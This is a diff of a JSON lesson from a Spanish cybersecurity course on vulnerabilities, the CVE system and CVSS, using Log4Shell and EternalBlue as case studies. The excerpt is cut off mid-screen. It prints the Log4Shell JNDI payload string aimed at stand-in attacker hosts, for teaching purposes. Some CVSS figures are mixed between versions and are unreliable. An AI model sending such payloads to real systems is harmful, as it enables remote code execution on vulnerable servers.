@@ -1,664 +1,679 @@
-[
-  {
-    "screen_id": 1,
-    "type": "step_revelation",
-    "title": "Caso Real: Log4Shell (Diciembre 2021)",
-    "duration": 240,
-    "content": {
-      "story_title": "Log4Shell: La Vulnerabilidad de Severidad 10.0",
-      "story_intro": "9 de diciembre, 2021. Una vulnerabilidad en Log4j, una librería de logging usada por millones de aplicaciones Java, es revelada públicamente. CVSS 10.0. Explotación trivial. Caos global.",
-      "steps": [
-        {
-          "id": "1",
-          "icon": "bug_report",
-          "title": "9 Diciembre, 2021 - CVE-2021-44228",
-          "content": "Chen Zhaojun de Alibaba Cloud descubre una vulnerabilidad crítica en Apache Log4j 2, una de las librerías de logging más usadas en el mundo Java. CVSS score: 10.0 (máximo posible). Permite Remote Code Execution (RCE) con una sola string maliciosa. Explotación trivialmente simple.",
-          "insight": "Log4j está en TODAS PARTES: servidores web, aplicaciones empresariales, dispositivos IoT, juegos (Minecraft), servicios cloud. Se estima que 3 billones de dispositivos estaban vulnerables."
-        },
-        {
-          "id": "2",
-          "icon": "code",
-          "title": "El Exploit: JNDI Injection",
-          "content": "El ataque es devastadoramente simple. Un atacante envía una string especial: ${jndi:ldap://malicious.com/a}. Log4j procesa esta string, hace lookup JNDI, se conecta al servidor del atacante, descarga y EJECUTA código Java malicioso. Todo automático. En logs, headers HTTP, cualquier input.",
-          "insight": "La simplicidad del exploit lo hace aterrador. No requiere autenticación. No requiere acceso especial. Solo necesitas que tu input llegue a un log. User-Agent header en HTTP = explotado."
-        },
-        {
-          "id": "3",
-          "icon": "public",
-          "title": "Propagación Masiva: 72 Horas de Pánico",
-          "content": "10 de diciembre: Minecraft servers comprometidos en masa. 11 de diciembre: Apple iCloud, Amazon AWS, Tesla, Twitter, Cloudflare reportan vulnerabilidad. 12 de diciembre: Escaneos masivos en internet, botnets desplegando exploits. CISA declara emergencia. Todos los CISO del mundo trabajando 24/7.",
-          "insight": "El tiempo de weaponización fue HORAS. Normalmente toma días/semanas. Log4Shell fue tan simple que exploits estaban en GitHub horas después de la revelación. Sin tiempo para parchear."
-        },
-        {
-          "id": "4",
-          "icon": "healing",
-          "title": "La Carrera del Patching",
-          "content": "Apache lanza Log4j 2.15.0... pero tiene bypass. Luego 2.16.0... bypass. Finalmente 2.17.0 resuelve todo. Pero ¿cómo saber DÓNDE está Log4j? Está en dependencias transitivas, JARs anidados, contenedores Docker. Organizaciones escanean miles de aplicaciones buscando la librería.",
-          "insight": "Software Bill of Materials (SBOM) se volvió crítico de la noche a la mañana. Empresas sin inventory de dependencias no sabían qué tenían que parchear. Algunos tardaron MESES en encontrar todas las instancias."
-        },
-        {
-          "id": "5",
-          "icon": "security",
-          "title": "Mitigación de Emergencia",
-          "content": "No puedes parchear inmediatamente: Workarounds temporales. Deshabilitar JNDI lookups (-Dlog4j2.formatMsgNoLookups=true). WAF rules para detectar ${jndi:. Network segmentation para limitar egress. IDS signatures. Monitoring intensivo de conexiones LDAP/RMI sospechosas.",
-          "insight": "Cloudflare bloqueó 20 millones de exploits en 72 horas. AWS desplegó patches automáticos. Google creó scanner open-source. La industria se unió como nunca."
-        },
-        {
-          "id": "6",
-          "icon": "timeline",
-          "title": "Impacto a Largo Plazo",
-          "content": "2 años después, Log4Shell SIGUE siendo explotado. Sistemas legacy sin parchear. Botnets masivos (Mirai variant) usan Log4Shell. APTs lo integran en arsenales. Costo global: $10B+ en remediation. Cambió cómo la industria piensa en dependencias open-source. Gobiernos crearon regulaciones sobre SBOM.",
-          "insight": "Log4Shell demostró que una librería de logging oscura puede comprometer el mundo entero. Open-source es maravilloso pero tiene riesgos sistémicos. Se necesita funding para mantener infraestructura crítica."
-        }
-      ]
-    }
-  },
-  {
-    "screen_id": 2,
-    "type": "memory_cards",
-    "title": "Vulnerabilidades: Conceptos Fundamentales",
-    "duration": 240,
-    "content": {
-      "description": "Entiende los conceptos clave sobre vulnerabilidades de software",
-      "cards": [
-        {
-          "id": "1",
-          "front": {
+{
+  "id": "c1_l3",
+  "title": "Vulnerabilidades y CVE",
+  "description": "Caso Real: Log4Shell (Diciembre 2021)",
+  "type": "interactive",
+  "duration_minutes": 32,
+  "xp_reward": 20,
+  "order_index": 3,
+  "course_id": 1,
+  "total_screens": 8,
+  "screens": [
+    {
+      "screen_id": 1,
+      "type": "step_revelation",
+      "title": "Caso Real: Log4Shell (Diciembre 2021)",
+      "duration": 240,
+      "content": {
+        "story_title": "Log4Shell: La Vulnerabilidad de Severidad 10.0",
+        "story_intro": "9 de diciembre, 2021. Una vulnerabilidad en Log4j, una librería de logging usada por millones de aplicaciones Java, es revelada públicamente. CVSS 10.0. Explotación trivial. Caos global.",
+        "steps": [
+          {
+            "id": "1",
             "icon": "bug_report",
-            "term": "Vulnerabilidad",
-            "color": "#D32F2F"
+            "title": "9 Diciembre, 2021 - CVE-2021-44228",
+            "content": "Chen Zhaojun de Alibaba Cloud descubre una vulnerabilidad crítica en Apache Log4j 2, una de las librerías de logging más usadas en el mundo Java. CVSS score: 10.0 (máximo posible). Permite Remote Code Execution (RCE) con una sola string maliciosa. Explotación trivialmente simple.",
+            "insight": "Log4j está en TODAS PARTES: servidores web, aplicaciones empresariales, dispositivos IoT, juegos (Minecraft), servicios cloud. Se estima que 3 billones de dispositivos estaban vulnerables."
           },
-          "back": {
-            "definition": "Debilidad o fallo en software, hardware o proceso que puede ser explotado por un atacante para comprometer confidencialidad, integridad o disponibilidad de un sistema. Puede ser bug de código, configuración incorrecta o fallo de diseño.",
-            "example": "Log4Shell (CVE-2021-44228): Fallo en Log4j que permite RCE. EternalBlue (CVE-2017-0144): Buffer overflow en SMBv1. Heartbleed (CVE-2014-0160): Leak de memoria en OpenSSL.",
-            "color": "#EF5350"
-          }
-        },
-        {
-          "id": "2",
-          "front": {
-            "icon": "new_releases",
-            "term": "Zero-Day",
-            "color": "#FF6F00"
+          {
+            "id": "2",
+            "icon": "code",
+            "title": "El Exploit: JNDI Injection",
+            "content": "El ataque es devastadoramente simple. Un atacante envía una string especial: ${jndi:ldap://malicious.com/a}. Log4j procesa esta string, hace lookup JNDI, se conecta al servidor del atacante, descarga y EJECUTA código Java malicioso. Todo automático. En logs, headers HTTP, cualquier input.",
+            "insight": "La simplicidad del exploit lo hace aterrador. No requiere autenticación. No requiere acceso especial. Solo necesitas que tu input llegue a un log. User-Agent header en HTTP = explotado."
           },
-          "back": {
-            "definition": "Vulnerabilidad desconocida públicamente que está siendo activamente explotada antes de que el vendor la conozca o tenga tiempo de parchear. 'Zero días' para defenderse. Extremadamente valiosas en mercado negro.",
-            "example": "Stuxnet usó 4 zero-days simultáneamente. NSA's Equation Group tenía arsenal de zero-days. Zerodium paga hasta $2.5M por iOS zero-day con RCE. Governments las compran para espionaje.",
-            "color": "#FFB74D"
-          }
-        },
-        {
-          "id": "3",
-          "front": {
-            "icon": "exposure",
-            "term": "Exploit",
-            "color": "#7B1FA2"
+          {
+            "id": "3",
+            "icon": "public",
+            "title": "Propagación Masiva: 72 Horas de Pánico",
+            "content": "10 de diciembre: Minecraft servers comprometidos en masa. 11 de diciembre: Apple iCloud, Amazon AWS, Tesla, Twitter, Cloudflare reportan vulnerabilidad. 12 de diciembre: Escaneos masivos en internet, botnets desplegando exploits. CISA declara emergencia. Todos los CISO del mundo trabajando 24/7.",
+            "insight": "El tiempo de weaponización fue HORAS. Normalmente toma días/semanas. Log4Shell fue tan simple que exploits estaban en GitHub horas después de la revelación. Sin tiempo para parchear."
           },
-          "back": {
-            "definition": "Código o técnica que aprovecha una vulnerabilidad específica para lograr resultado no intencionado: ejecutar código, elevar privilegios, exfiltrar datos. Los exploits pueden ser públicos (ExploitDB, Metasploit) o privados (APTs).",
-            "example": "EternalBlue exploit para MS17-010. Mimikatz para extraer passwords de memoria. SQLMap para inyecciones SQL automatizadas. Exploit kits como Angler, Magnitude para drive-by downloads.",
-            "color": "#BA68C8"
-          }
-        },
-        {
-          "id": "4",
-          "front": {
-            "icon": "update",
-            "term": "Patch",
-            "color": "#388E3C"
+          {
+            "id": "4",
+            "icon": "healing",
+            "title": "La Carrera del Patching",
+            "content": "Apache lanza Log4j 2.15.0... pero tiene bypass. Luego 2.16.0... bypass. Finalmente 2.17.0 resuelve todo. Pero ¿cómo saber DÓNDE está Log4j? Está en dependencias transitivas, JARs anidados, contenedores Docker. Organizaciones escanean miles de aplicaciones buscando la librería.",
+            "insight": "Software Bill of Materials (SBOM) se volvió crítico de la noche a la mañana. Empresas sin inventory de dependencias no sabían qué tenían que parchear. Algunos tardaron MESES en encontrar todas las instancias."
           },
-          "back": {
-            "definition": "Actualización de software que corrige vulnerabilidades, bugs o mejora funcionalidad. Vendors liberan patches después de descubrir o ser notificados de vulnerabilidades. Patch management es proceso crítico de seguridad.",
-            "example": "MS17-010 parcheó EternalBlue en marzo 2017. Apache Log4j 2.17.0 finalmente resolvió Log4Shell. Patch Tuesday: Microsoft libera patches segundo martes de cada mes. Critical patches deben aplicarse en 24-48h.",
-            "color": "#66BB6A"
-          }
-        },
-        {
-          "id": "5",
-          "front": {
-            "icon": "schedule",
-            "term": "N-Day",
-            "color": "#0288D1"
+          {
+            "id": "5",
+            "icon": "security",
+            "title": "Mitigación de Emergencia",
+            "content": "No puedes parchear inmediatamente: Workarounds temporales. Deshabilitar JNDI lookups (-Dlog4j2.formatMsgNoLookups=true). WAF rules para detectar ${jndi:. Network segmentation para limitar egress. IDS signatures. Monitoring intensivo de conexiones LDAP/RMI sospechosas.",
+            "insight": "Cloudflare bloqueó 20 millones de exploits en 72 horas. AWS desplegó patches automáticos. Google creó scanner open-source. La industria se unió como nunca."
           },
-          "back": {
-            "definition": "Vulnerabilidad conocida públicamente con patch disponible pero aún no aplicado por muchas organizaciones. 'N días' después de disclosure. Los atacantes explotan masivamente porque saben que muchos no parchean rápido.",
-            "example": "EternalBlue era N-Day cuando WannaCry atacó (patch disponible 58 días). Log4Shell se volvió N-Day instantáneamente. Equifax breach usó CVE-2017-5638 (Struts) que tenía patch disponible por 2 meses.",
-            "color": "#42A5F5"
+          {
+            "id": "6",
+            "icon": "timeline",
+            "title": "Impacto a Largo Plazo",
+            "content": "2 años después, Log4Shell SIGUE siendo explotado. Sistemas legacy sin parchear. Botnets masivos (Mirai variant) usan Log4Shell. APTs lo integran en arsenales. Costo global: $10B+ en remediation. Cambió cómo la industria piensa en dependencias open-source. Gobiernos crearon regulaciones sobre SBOM.",
+            "insight": "Log4Shell demostró que una librería de logging oscura puede comprometer el mundo entero. Open-source es maravilloso pero tiene riesgos sistémicos. Se necesita funding para mantener infraestructura crítica."
           }
-        }
-      ]
-    }
-  },
-  {
-    "screen_id": 3,
-    "type": "progress_checklist",
-    "title": "Sistema CVE: Common Vulnerabilities and Exposures",
-    "duration": 300,
-    "content": {
-      "title": "Domina el Sistema de Nomenclatura de Vulnerabilidades",
-      "items": [
-        {
-          "id": "cve_structure",
-          "task": "Estructura de un CVE ID",
-          "subtitle": "CVE-YYYY-NNNN",
-          "icon": "label",
-          "unlock_content": {
-            "title": "Anatomía de un CVE ID",
-            "points": [
-              "Formato: CVE-[AÑO]-[NÚMERO SECUENCIAL]",
-              "Ejemplo: CVE-2021-44228 (Log4Shell)",
-              "CVE: Common Vulnerabilities and Exposures",
-              "2021: Año de asignación (no necesariamente de discovery o disclosure)",
-              "44228: Número secuencial único asignado por MITRE",
-              "IDs son permanentes, no se reutilizan nunca",
-              "Pre-2014: formato CVE-YYYY-NNNN (4 dígitos). Post-2014: sin límite de dígitos"
-            ],
-            "bonus_fact": "En 2023 se asignaron 28,902 nuevos CVEs. El CVE más alto de 2023 fue CVE-2023-51467. El sistema está escalando porque cada vez se reportan más vulnerabilidades."
-          }
-        },
-        {
-          "id": "cna",
-          "task": "CNAs: CVE Numbering Authorities",
-          "subtitle": "Quién puede asignar CVE IDs",
-          "icon": "verified",
-          "unlock_content": {
-            "title": "Autoridades de Numeración",
-            "points": [
-              "CNAs: Organizaciones autorizadas por MITRE para asignar CVE IDs",
-              "Incluyen: Vendors (Microsoft, Apple, Google), coordinadores (CERT/CC), investigadores",
-              "Vendors pueden asignar CVEs para sus propios productos",
-              "Acelera el proceso: no necesita pasar por MITRE central",
-              "200+ CNAs activos globalmente en 2024",
-              "CNA of Last Resort (CNA-LR): MITRE asigna si nadie más puede",
-              "Proceso: Researcher reporta → Vendor asigna CVE → Disclosure coordinado"
-            ],
-            "bonus_fact": "Microsoft es el CNA más prolífico. Asigna cientos de CVEs al año, principalmente en Patch Tuesday. Tienen proceso automatizado porque el volumen es enorme."
-          }
-        },
-        {
-          "id": "nvd",
-          "task": "NVD: National Vulnerability Database",
-          "subtitle": "Base de datos pública de NIST",
-          "icon": "storage",
-          "unlock_content": {
-            "title": "El Repositorio Definitivo",
-            "points": [
-              "NVD: Base de datos del gobierno de EE.UU. mantenida por NIST",
-              "URL: nvd.nist.gov",
-              "Contenido: Todos los CVEs + análisis adicional de NIST",
-              "Información: CVSS scores, CPE, CWE, referencias, patches",
-              "Actualización: Diaria, automatizada vía feeds XML/JSON",
-              "APIs disponibles para integración en herramientas de scanning",
-              "Búsqueda: Por CVE, vendor, producto, severidad, fecha",
-              "Gratis y público: cualquiera puede consultar"
-            ],
-            "bonus_fact": "NVD procesa ~50 CVEs por DÍA. En diciembre 2021 (Log4Shell) procesaron 200+ CVEs relacionados en una semana. El equipo trabajó 24/7 para mantener actualizada la base de datos."
-          }
-        },
-        {
-          "id": "disclosure",
-          "task": "Responsible Disclosure",
-          "subtitle": "Cómo se reportan vulnerabilidades éticamente",
-          "icon": "shield",
-          "unlock_content": {
-            "title": "El Proceso Ético",
-            "points": [
-              "1. Researcher descubre vulnerabilidad",
-              "2. Reporta PRIVADAMENTE al vendor (no publicar aún)",
-              "3. Vendor confirma y desarrolla patch (típicamente 90 días)",
-              "4. Disclosure coordinado: vendor libera patch + researcher publica detalles",
-              "5. Se asigna CVE ID",
-              "Bug bounties incentivan responsible disclosure con recompensas monetarias",
-              "Full disclosure: Publicar inmediatamente (controversial, presiona a vendors)"
-            ],
-            "bonus_fact": "Google Project Zero da 90 días a vendors antes de full disclosure. Si no hay patch en 90 días, publican anyway. Política controversial pero efectiva: vendors priorizan porque saben que clock está corriendo."
-          }
-        },
-        {
-          "id": "lifecycle",
-          "task": "Ciclo de Vida de una Vulnerabilidad",
-          "subtitle": "De descubrimiento a remediación",
-          "icon": "autorenew",
-          "unlock_content": {
-            "title": "Las 6 Etapas",
-            "points": [
-              "1. DISCOVERY: Researcher/atacante encuentra vuln",
-              "2. DISCLOSURE: Reportada a vendor (privado) o pública",
-              "3. PATCH DEVELOPMENT: Vendor crea fix (días a meses)",
-              "4. PATCH RELEASE: Update disponible públicamente",
-              "5. DEPLOYMENT: Organizaciones aplican patch (0-∞ días)",
-              "6. EXPLOITATION: Atacantes explotan durante ventana entre disclosure y deployment",
-              "Window of Exposure: Tiempo entre disclosure pública y patch aplicado",
-              "Race condition: Organizaciones vs Atacantes"
-            ],
-            "bonus_fact": "Tiempo promedio de patch development: 30 días para critical. Tiempo promedio de deployment: 100+ días. Window of Exposure típico: 70+ días. Por eso los zero-days son tan valiosos: window es infinita hasta discovery."
-          }
-        }
-      ]
-    }
-  },
-  {
-    "screen_id": 4,
-    "type": "memory_cards",
-    "title": "CVSS: Common Vulnerability Scoring System",
-    "duration": 240,
-    "content": {
-      "description": "Sistema estándar para medir severidad de vulnerabilidades (0.0 - 10.0)",
-      "cards": [
-        {
-          "id": "1",
-          "front": {
-            "icon": "speed",
-            "term": "CVSS Score",
-            "color": "#D32F2F"
+        ]
+      }
+    },
+    {
+      "screen_id": 2,
+      "type": "memory_cards",
+      "title": "Vulnerabilidades: Conceptos Fundamentales",
+      "duration": 240,
+      "content": {
+        "description": "Entiende los conceptos clave sobre vulnerabilidades de software",
+        "cards": [
+          {
+            "id": "1",
+            "front": {
+              "icon": "bug_report",
+              "term": "Vulnerabilidad",
+              "color": "#D32F2F"
+            },
+            "back": {
+              "definition": "Debilidad o fallo en software, hardware o proceso que puede ser explotado por un atacante para comprometer confidencialidad, integridad o disponibilidad de un sistema. Puede ser bug de código, configuración incorrecta o fallo de diseño.",
+              "example": "Log4Shell (CVE-2021-44228): Fallo en Log4j que permite RCE. EternalBlue (CVE-2017-0144): Buffer overflow en SMBv1. Heartbleed (CVE-2014-0160): Leak de memoria en OpenSSL.",
+              "color": "#EF5350"
+            }
           },
-          "back": {
-            "definition": "Puntuación numérica de 0.0 (mínimo) a 10.0 (máximo) que representa la severidad de una vulnerabilidad. Calculada usando métricas estandarizadas. Ayuda a priorizar remediación. Versión actual: CVSS v3.1 (2019), v4.0 disponible desde 2023.",
-            "example": "Log4Shell: 10.0 (crítico). EternalBlue: 9.3 (crítico). Heartbleed: 7.5 (alto). 10.0 es raro: requiere RCE sin autenticación, fácil explotación, impacto total. Solo ~1% de CVEs son 10.0.",
-            "color": "#EF5350"
-          }
-        },
-        {
-          "id": "2",
-          "front": {
-            "icon": "network_check",
-            "term": "Attack Vector (AV)",
-            "color": "#FF6F00"
+          {
+            "id": "2",
+            "front": {
+              "icon": "new_releases",
+              "term": "Zero-Day",
+              "color": "#FF6F00"
+            },
+            "back": {
+              "definition": "Vulnerabilidad desconocida públicamente que está siendo activamente explotada antes de que el vendor la conozca o tenga tiempo de parchear. 'Zero días' para defenderse. Extremadamente valiosas en mercado negro.",
+              "example": "Stuxnet usó 4 zero-days simultáneamente. NSA's Equation Group tenía arsenal de zero-days. Zerodium paga hasta $2.5M por iOS zero-day con RCE. Governments las compran para espionaje.",
+              "color": "#FFB74D"
+            }
           },
-          "back": {
-            "definition": "Cómo puede ser explotada la vulnerabilidad. Network (N): Remotamente vía internet. Adjacent (A): Misma LAN. Local (L): Acceso local requerido. Physical (P): Acceso físico. Network es más severo porque atacante puede estar en cualquier lugar.",
-            "example": "Log4Shell: Network (N) - explotable desde internet. EternalBlue: Network (N) - via SMB puerto 445. USB malware: Physical (P) - requiere insertar USB. Privilege escalation: Local (L) - necesitas ya estar dentro.",
-            "color": "#FFB74D"
-          }
-        },
-        {
-          "id": "3",
-          "front": {
-            "icon": "lock_open",
-            "term": "Attack Complexity (AC)",
-            "color": "#7B1FA2"
+          {
+            "id": "3",
+            "front": {
+              "icon": "exposure",
+              "term": "Exploit",
+              "color": "#7B1FA2"
+            },
+            "back": {
+              "definition": "Código o técnica que aprovecha una vulnerabilidad específica para lograr resultado no intencionado: ejecutar código, elevar privilegios, exfiltrar datos. Los exploits pueden ser públicos (ExploitDB, Metasploit) o privados (APTs).",
+              "example": "EternalBlue exploit para MS17-010. Mimikatz para extraer passwords de memoria. SQLMap para inyecciones SQL automatizadas. Exploit kits como Angler, Magnitude para drive-by downloads.",
+              "color": "#BA68C8"
+            }
           },
-          "back": {
-            "definition": "Dificultad técnica para explotar. Low (L): Fácil, reproducible, no requiere condiciones especiales. High (H): Difícil, requiere timing perfecto, race conditions, configuración específica. Low es más severo porque cualquiera puede explotar.",
-            "example": "Log4Shell: Low (L) - solo enviar ${jndi:ldap://evil.com/a}. Súper simple. Heartbleed: Low (L) - script de 10 líneas. Race condition en kernel: High (H) - timing perfecto, falla frecuentemente.",
-            "color": "#BA68C8"
-          }
-        },
-        {
-          "id": "4",
-          "front": {
-            "icon": "how_to_reg",
-            "term": "Privileges Required (PR)",
-            "color": "#0288D1"
+          {
+            "id": "4",
+            "front": {
+              "icon": "update",
+              "term": "Patch",
+              "color": "#388E3C"
+            },
+            "back": {
+              "definition": "Actualización de software que corrige vulnerabilidades, bugs o mejora funcionalidad. Vendors liberan patches después de descubrir o ser notificados de vulnerabilidades. Patch management es proceso crítico de seguridad.",
+              "example": "MS17-010 parcheó EternalBlue en marzo 2017. Apache Log4j 2.17.0 finalmente resolvió Log4Shell. Patch Tuesday: Microsoft libera patches segundo martes de cada mes. Critical patches deben aplicarse en 24-48h.",
+              "color": "#66BB6A"
+            }
           },
-          "back": {
-            "definition": "Nivel de privilegios necesario antes de explotar. None (N): No requiere autenticación. Low (L): Usuario normal. High (H): Admin/privileged. None es más severo porque atacante externo puede explotar sin credentials.",
-            "example": "Log4Shell: None (N) - sin autenticación necesaria. SQLi en login form: None (N). Local privilege escalation: Low (L) - necesitas cuenta de usuario primero. Kernel exploit local: Low (L).",
-            "color": "#42A5F5"
+          {
+            "id": "5",
+            "front": {
+              "icon": "schedule",
+              "term": "N-Day",
+              "color": "#0288D1"
+            },
+            "back": {
+              "definition": "Vulnerabilidad conocida públicamente con patch disponible pero aún no aplicado por muchas organizaciones. 'N días' después de disclosure. Los atacantes explotan masivamente porque saben que muchos no parchean rápido.",
+              "example": "EternalBlue era N-Day cuando WannaCry atacó (patch disponible 58 días). Log4Shell se volvió N-Day instantáneamente. Equifax breach usó CVE-2017-5638 (Struts) que tenía patch disponible por 2 meses.",
+              "color": "#42A5F5"
+            }
           }
-        },
-        {
-          "id": "5",
-          "front": {
-            "icon": "person",
-            "term": "User Interaction (UI)",
-            "color": "#388E3C"
+        ]
+      }
+    },
+    {
+      "screen_id": 3,
+      "type": "progress_checklist",
+      "title": "Sistema CVE: Common Vulnerabilities and Exposures",
+      "duration": 300,
+      "content": {
+        "title": "Domina el Sistema de Nomenclatura de Vulnerabilidades",
+        "items": [
+          {
+            "id": "cve_structure",
+            "task": "Estructura de un CVE ID",
+            "subtitle": "CVE-YYYY-NNNN",
+            "icon": "label",
+            "unlock_content": {
+              "title": "Anatomía de un CVE ID",
+              "points": [
+                "Formato: CVE-[AÑO]-[NÚMERO SECUENCIAL]",
+                "Ejemplo: CVE-2021-44228 (Log4Shell)",
+                "CVE: Common Vulnerabilities and Exposures",
+                "2021: Año de asignación (no necesariamente de discovery o disclosure)",
+                "44228: Número secuencial único asignado por MITRE",
+                "IDs son permanentes, no se reutilizan nunca",
+                "Pre-2014: formato CVE-YYYY-NNNN (4 dígitos). Post-2014: sin límite de dígitos"
+              ],
+              "bonus_fact": "En 2023 se asignaron 28,902 nuevos CVEs. El CVE más alto de 2023 fue CVE-2023-51467. El sistema está escalando porque cada vez se reportan más vulnerabilidades."
+            }
           },
-          "back": {
-            "definition": "¿Requiere acción del usuario? None (N): Completamente automatizable, no requiere víctima activa. Required (R): Usuario debe hacer algo (click link, abrir archivo). None es más severo porque worms pueden propagarse sin humanos.",
-            "example": "Log4Shell: None (N) - automático. EternalBlue: None (N) - worm auto-propagable. Phishing con macro maliciosa: Required (R) - víctima debe abrir documento y habilitar macros. XSS: Required (R) - víctima debe visitar URL.",
-            "color": "#66BB6A"
-          }
-        },
-        {
-          "id": "6",
-          "front": {
-            "icon": "crisis_alert",
-            "term": "Impact: CIA",
-            "color": "#C62828"
+          {
+            "id": "cna",
+            "task": "CNAs: CVE Numbering Authorities",
+            "subtitle": "Quién puede asignar CVE IDs",
+            "icon": "verified",
+            "unlock_content": {
+              "title": "Autoridades de Numeración",
+              "points": [
+                "CNAs: Organizaciones autorizadas por MITRE para asignar CVE IDs",
+                "Incluyen: Vendors (Microsoft, Apple, Google), coordinadores (CERT/CC), investigadores",
+                "Vendors pueden asignar CVEs para sus propios productos",
+                "Acelera el proceso: no necesita pasar por MITRE central",
+                "200+ CNAs activos globalmente en 2024",
+                "CNA of Last Resort (CNA-LR): MITRE asigna si nadie más puede",
+                "Proceso: Researcher reporta → Vendor asigna CVE → Disclosure coordinado"
+              ],
+              "bonus_fact": "Microsoft es el CNA más prolífico. Asigna cientos de CVEs al año, principalmente en Patch Tuesday. Tienen proceso automatizado porque el volumen es enorme."
+            }
           },
-          "back": {
-            "definition": "Impacto en Confidencialidad, Integridad, Disponibilidad. Cada uno: None (N), Low (L), High (H). High significa compromiso total del componente. Log4Shell es H/H/H: lee todo, modifica todo, puede denegar servicio. Peor caso posible.",
-            "example": "RCE típico: H/H/H (control total). Information disclosure: H/N/N (solo leak). DoS: N/N/H (solo caída). Integrity violation: N/H/N (modificación sin leak). Scoring considera los 3 juntos para total.",
-            "color": "#E53935"
-          }
-        }
-      ]
-    }
-  },
-  {
-    "screen_id": 5,
-    "type": "progress_checklist",
-    "title": "Lab: Analiza CVE-2017-0144 (EternalBlue)",
-    "duration": 360,
-    "content": {
-      "title": "Análisis Forense de la Vulnerabilidad de WannaCry",
-      "items": [
-        {
-          "id": "nvd_lookup",
-          "task": "Consultar CVE en NVD",
-          "subtitle": "nvd.nist.gov/vuln/detail/CVE-2017-0144",
-          "icon": "search",
-          "unlock_content": {
-            "title": "Información Básica del CVE",
-            "points": [
-              "CVE ID: CVE-2017-0144",
-              "Published: 2017-03-16",
-              "CVSS v3: 8.1 (HIGH) - originalmente, luego recalculado a 9.3",
-              "CVSS v2: 9.3 (HIGH)",
-              "Tipo: CWE-119 (Buffer Overflow)",
-              "Affected: Microsoft Windows SMBv1 server (todas las versiones de Windows)",
-              "Vector String: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "Descripción: Buffer overflow permite remote code execution via paquetes SMB craftados"
-            ],
-            "bonus_fact": "Microsoft asignó MS17-010 (bulletin) a este CVE. Un solo bulletin puede cubrir múltiples CVEs. MS17-010 parcheó 9 vulnerabilidades relacionadas en SMB, pero CVE-2017-0144 fue la que WannaCry explotó."
-          }
-        },
-        {
-          "id": "cvss_breakdown",
-          "task": "Desglosar CVSS Score",
-          "subtitle": "¿Por qué 9.3 de severidad?",
-          "icon": "analytics",
-          "unlock_content": {
-            "title": "Análisis de Métricas CVSS",
-            "points": [
-              "Attack Vector (AV:N): Network - explotable remotamente via internet",
-              "Attack Complexity (AC:L): Low - fácil de explotar, código público disponible",
-              "Privileges Required (PR:N): None - sin autenticación necesaria",
-              "User Interaction (UI:N): None - completamente automatizable, worm",
-              "Scope (S:U): Unchanged - afecta solo el componente vulnerable",
-              "Confidentiality (C:H): High - acceso completo a datos",
-              "Integrity (I:H): High - control total del sistema",
-              "Availability (A:H): High - puede denegar servicio",
-              "RESULTADO: 9.3 = Crítico, RCE sin autenticación, impacto máximo"
-            ],
-            "bonus_fact": "Un 9.3 es casi el máximo posible. Solo le falta ser 10.0, lo cual requeriría Scope Changed (S:C) o Attack Complexity aún más baja. EternalBlue es prácticamente el peor escenario posible para una vulnerabilidad."
-          }
-        },
-        {
-          "id": "exploitation",
-          "task": "Entender la Explotación",
-          "subtitle": "Cómo funciona EternalBlue técnicamente",
-          "icon": "code",
-          "unlock_content": {
-            "title": "Mecánica del Exploit",
-            "points": [
-              "Vulnerabilidad: Buffer overflow en srv.sys (SMB driver de Windows kernel)",
-              "Puerto: 445/TCP (SMB)",
-              "Trigger: Paquetes SMB especialmente craftados con size fields maliciosos",
-              "Efecto: Overflow de buffer en kernel space → control de EIP (instruction pointer)",
-              "Payload: Shellcode ejecutado con privilegios SYSTEM (máximo en Windows)",
-              "Seguimiento: DoublePulsar backdoor para persistencia y ejecución adicional",
-              "Detección: IDS rules para patrones específicos, pero bypass posible",
-              "Mitigación: Patch MS17-010 O deshabilitar SMBv1 completamente"
-            ],
-            "bonus_fact": "EternalBlue fue desarrollado por NSA's Tailored Access Operations (TAO) unit como herramienta de espionaje. Lo mantuvieron secreto por AÑOS hasta que Shadow Brokers lo filtró en abril 2017."
-          }
-        },
-        {
-          "id": "timeline",
-          "task": "Reconstruir Timeline",
-          "subtitle": "De descubrimiento a WannaCry",
-          "icon": "timeline",
-          "unlock_content": {
-            "title": "Línea de Tiempo Crítica",
-            "points": [
-              "Pre-2017: NSA descubre vulnerabilidad, desarrolla exploit, lo usa para espionaje",
-              "Abril 2017: Shadow Brokers filtra herramientas de NSA incluyendo EternalBlue",
-              "14 Marzo 2017: Microsoft libera patch MS17-010 (58 días ANTES de WannaCry)",
-              "12 Mayo 2017: WannaCry comienza propagación masiva usando EternalBlue",
-              "13 Mayo 2017: Marcus Hutchins registra kill switch domain, detiene propagación",
-              "27 Junio 2017: NotPetya usa EternalBlue, causa $10B en daños",
-              "2018-2024: EternalBlue SIGUE siendo explotado en sistemas sin parchear",
-              "Lección: 58 días de warning no fueron suficientes. Patch management salvó vidas."
-            ],
-            "bonus_fact": "Microsoft tomó decisión histórica de patchear Windows XP (oficialmente end-of-life desde 2014) debido a la severidad. Liberaron parches para XP, Windows 8, Server 2003 a pesar de no tener soporte."
-          }
-        },
-        {
-          "id": "impact_analysis",
-          "task": "Calcular Impacto Global",
-          "subtitle": "Daños causados por esta única vulnerabilidad",
-          "icon": "public",
-          "unlock_content": {
-            "title": "El Verdadero Costo de CVE-2017-0144",
-            "points": [
-              "WannaCry: 200,000+ sistemas, 150 países, $4B en daños",
-              "NotPetya: Maersk perdió $300M, FedEx $400M, total global $10B+",
-              "NHS UK: 19,000 citas canceladas, cirugías pospuestas",
-              "Infraestructura: Puerto de San Diego, sistema de tránsito de SF, múltiples gobiernos",
-              "Sistemas vulnerables: Aún en 2024, ~1M de sistemas exponen puerto 445 con SMBv1",
-              "Long tail: Botnets usan EternalBlue para propagación años después",
-              "Total estimado: >$15B en daños económicos globales por UN solo CVE",
-              "Prevención: Simple patch de 5MB hubiera prevenido TODO"
-            ],
-            "bonus_fact": "CVE-2017-0144 es probablemente la vulnerabilidad más costosa de la historia en términos de daños económicos. Superó incluso a Code Red y Slammer. Una lección de $15B sobre patch management."
-          }
-        }
-      ]
-    }
-  },
-  {
-    "screen_id": 6,
-    "type": "progress_checklist",
-    "title": "Calculadora CVSS: Evalúa Severidad",
-    "duration": 240,
-    "content": {
-      "title": "Practica Calculando CVSS para Diferentes Vulnerabilidades",
-      "items": [
-        {
-          "id": "scenario_1",
-          "task": "Scenario 1: XSS en Sitio Web Público",
-          "subtitle": "Cross-Site Scripting en formulario de comentarios",
-          "icon": "code",
-          "unlock_content": {
-            "title": "Cálculo CVSS para XSS",
-            "points": [
